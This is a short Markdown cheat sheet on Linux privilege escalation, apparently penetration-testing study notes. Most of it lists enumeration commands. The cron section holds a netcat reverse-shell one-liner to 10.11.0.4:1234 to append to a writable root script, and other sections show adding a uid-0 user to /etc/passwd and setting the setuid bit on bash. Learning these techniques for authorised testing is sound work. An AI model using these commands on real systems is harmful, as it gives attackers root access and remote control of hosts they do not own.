# Linux privilege escalation  

Find out what user is currently logged in.  

`whoami`  

Find user context.  

`id`  

Find information from the hostname.  

`hostname`  

os version information.  

```
cat /etc/*-release
uname -a
```  

List processes, a and x with/without TTY and u for readable output.  

`ps aux`  

And in a tree format.  

`ps aux --forest`

## cron  

List cron.  

`ls -lah /etc/cron*`  

System cron jobs usually running as root.  

`cat /etc/crontab`  


To view running jobs in the cron log.  

`grep "CRON" /var/log/cron.log`  

If a writable script(user_backups.sh) is found as a cronjob, a reverse shell one liner can be appended.  

```
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
```  

## /etc/passwd  

If /etc/passwd is writable, another root user can be added.  

```
openssl passwd somepassword1
echo "root2:<somepassword1 hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```  

## bash  

If we can execute a command as root.  

```
chmod +s /usr/bin/bash
/usr/bin/bash -p
```  

## Kernel vulns  

Gathering info.  

To display message of login prompt.  

`cat /etc/issue`  

Kernel version.  

`uname -r`  

Architecture.  

`arch`  

## Network  

Display all network information.  

`ip a`  

`ifconfig a`  

Display route tables, depending on linux flavour/version.  

`/sbin/route`  

`/sbin/routel`  

List all connections, 'a' = all, 'n' = no dns, 'p' = print owning process.  

`ss -anp`  

Firewall rules as root user.  

`iptables`  

Some firewall rules can be found as a standard user.  

`/etc/iptables`  

## Applications  

View installed applications.  

`dpkg -l`  

## File permissions  

Using the find command.  

`find / -writable -type d 2>/dev/null`  

## Drives  

View mounted drives.  

`mount`  

`cat /etc/fstab`  

View all available disks.  

`/bin/lsblk`  

## Kernel modules  

Display kernel modules.  

`lsmod`  

Find information about a specific module.  

`/sbin/modinfo libata`  

## SUID  

Find SUID bits.  

`find / -perm -u=s -type f 2>/dev/null`  

